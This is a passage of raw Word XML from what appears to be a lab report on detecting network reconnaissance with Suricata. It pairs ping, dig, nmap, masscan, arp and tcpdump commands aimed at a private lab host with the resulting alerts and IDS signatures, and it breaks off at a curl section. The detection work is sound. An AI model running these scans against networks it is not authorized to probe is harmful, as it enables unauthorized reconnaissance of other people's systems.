      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Sweep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="30F60D84" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20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6A71571E" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ping 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192815C2" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>ICMP Echo Request (Ping) detected by Suricata.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>icmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:"ICMP echo request (ping) detected"; itype:8; sid:1000001;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31083FA1" w14:textId="23556283" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1100F4B4" wp14:editId="6CB85A88">
            <wp:extent cx="5572125" cy="409575"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="1532613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13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E259" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">1.3 DNS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Query</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>with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dig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C614887" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21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0B280E81" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>dig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> @192.168.1.10 example.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC12BD4" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>DNS query detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>udp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any 53 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:"DNS Query Detected"; content:"|00 00 01|"; sid:1000002;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A470E80" w14:textId="6EDD641B" w:rsidR="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65DBB1F5" wp14:editId="3846DEE5">
            <wp:extent cx="5572125" cy="333375"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="1358427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27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FF76" w14:textId="77777777" w:rsidR="00EF3D1C" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23042FE0" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>2. Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AD6303" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2.1 Single Port Scan with Nmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BC649A" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22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566C1AD2" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p 80 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4DD0F2" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Port Scan Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve">:"Port Scan Detected"; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>flags:S</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>threshold:type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> threshold, track </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>by_dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>, count 10, seconds 5; sid:1000003;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0F6F4E" w14:textId="3E2A1110" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="15AFC043" wp14:editId="126F7E6B">
            <wp:extent cx="5572125" cy="276225"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="1366696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96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B431" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2.2 Full Port Scan with Nmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08667FC4" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23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5F402C03" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE55691" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Port Scan Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve">:"Port Scan Detected"; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>flags:S</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>threshold:type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> threshold, track </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>by_dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>, count 10, seconds 5; sid:1000003;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1953CDD8" w14:textId="212D6080" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3A5038A0" wp14:editId="32991BB5">
            <wp:extent cx="5572125" cy="266700"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="643803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03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9D27" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">2.3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Masscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> Full Port </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Scan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="61F5B828" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24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2AA6D250" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>masscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.10 -p0-65535</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDF2399" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Masscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> detected; abnormal scanning patterns.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>Masscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> detected"; sid:1000004;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8FD150" w14:textId="5AF64A89" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65C56F51" wp14:editId="624C7547">
            <wp:extent cx="5572125" cy="295275"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="560706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06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9F7C" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">2.4 ARP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Scan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5FBC4571" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25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54C0E162" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06934492" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:r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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Detected ARP traffic via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr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5ABA51F4" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -i eth0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0EC50EBE" w14:textId="17187AD8" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0EF11BCA" wp14:editId="52C3DB60">
            <wp:extent cx="5572125" cy="361950"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="1969890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90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3FBA" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">2.5 HTTP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Request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with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Curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1B409EF6" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26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191EF56C" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
